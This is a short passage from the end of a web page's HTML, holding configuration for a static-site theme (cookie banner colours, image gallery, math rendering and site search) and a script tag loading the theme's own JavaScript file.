experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
